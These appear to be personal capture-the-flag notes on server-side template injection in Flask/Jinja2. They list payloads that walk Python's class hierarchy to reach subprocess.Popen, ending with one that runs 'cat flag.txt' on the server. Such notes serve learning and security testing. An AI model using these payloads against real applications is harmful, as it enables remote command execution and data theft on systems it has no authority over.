## Test SSTI

- Methodology in Payload all the things is very cool

- Start by testing all the language to find the good one


### jinja2

https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee

- `{{config.items()}}`
- `{{config.from_object('os')}}*`
- `{{config.items()}}`
- `{{''.__class__.__mro__}}`
- `{{''.__class__.__mro__[<index>].__subclasses__()}}`
- Pay attention when you are searching for subclasses, you may have to change the index (it's 1 in the cheat sheet, but could be different)
- When you want to search your index, copy paste the entire result in a variable in python, and use `<var>.split("<delimiter(for me ,)>")`
- then `<var>.index("<desired_function(for me <class 'subprocess.Popen'>)")`. Pay attention, it could have a space at the beginning.
- Or easier way : put it in vim, and substitute /> by a carriage return : `%S />/\r/g` and then find it.
- If you have subprocess.Popen, jackpot :)
- Check if it's the good one : `{{''.__class__.__mro__[<index>].__subclasses__()[<index_found>]}}`
- Then, go back on your system and understand how the function works (subprocess.popen and os.popen are different)
- subprocess.Popen(["ls", "-a"])
- suprocess.Popen("ls -a", shell=True)
- Then add communicate function to read it
- suprocess.Popen("ls -a", shell=True, stdout=-1).communicate()[0]
`{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}`
